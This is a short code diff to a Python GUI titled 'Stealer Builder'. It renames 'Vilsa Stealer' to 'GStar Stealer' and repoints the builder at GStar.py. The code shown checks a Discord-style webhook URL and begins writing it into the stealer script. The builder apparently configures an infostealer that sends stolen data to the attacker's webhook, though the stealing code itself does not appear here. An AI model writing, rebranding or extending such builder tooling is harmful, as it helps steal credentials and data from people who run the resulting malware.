@@ -5,7 +5,7 @@ from tkinter import messagebox, filedialog
 
 ctk.set_appearance_mode("dark")
 app = ctk.CTk()
-app.title(f"Vilsa Stealer Builder ~ Version 1.3")
+app.title(f"GStar Stealer Builder ~ Version 1.3")
 # app.iconbitmap("Vilsa Stealer_assets\\img\\logo.ico")
 app.geometry("400x240")
 app.resizable(False, False)
@@ -21,7 +21,7 @@ def validate_webhook(webhook):
     return 'api/webhooks' in webhook
 
 def replace_webhook(webhook):
-    file_path = 'VilsaStealer.py'
+    file_path = 'GStar.py'
 
     with open(file_path, 'r', encoding='utf-8') as file:
         lines = file.readlines()
